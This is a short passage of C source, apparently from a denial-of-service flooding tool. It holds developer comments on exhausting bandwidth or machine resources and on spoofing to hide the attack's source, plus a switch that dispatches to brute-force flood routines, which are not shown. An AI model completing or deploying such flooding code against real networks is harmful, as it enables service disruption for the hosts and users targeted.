//-->>	CHECK PACKET_QDISC_BYPASS option in "packet" manual page


	//exhaust network bandwidth or target machine resources (CPU, RAM , etc)?
		//i think bruteforce exhausts network bandwidth,
		//while protocol based exhausts machine resources (CPU, RAM, etc)
		//and hybrid might exhaust both
		//spoofing makes it hard to identify source of attack, which complicates defense mechanisms
printf("flowmask %x\n",flowmask);
	/*determine attack type*/
	switch(atk_code) {
		case 1: //.bruteforce (same flow key, additional parameters are static) (attack_1)
				//.(using same source address/same src addr. prefix "subnet")
			bruteforce_static(sock, ipv, l3proto, ip_option/*,ip_option/ip6_extension*/);
			break;
		case 2: //.bruteforce:(same flow key, flow key extension mask) (attack_2)
			bruteforce_dynamic(sock, ipv, l3proto, ip_option/*ip6_extension*/, flowmask, flowxmask);
			break;
		
		/*protocol based*/
		//case 4
		//..

		/*hybrid (bruteforce + protocol based)*/
		//..
			break;

		default:
			printf("this should never be printed\n");
			exit(1);
	}


	exit(0);

}


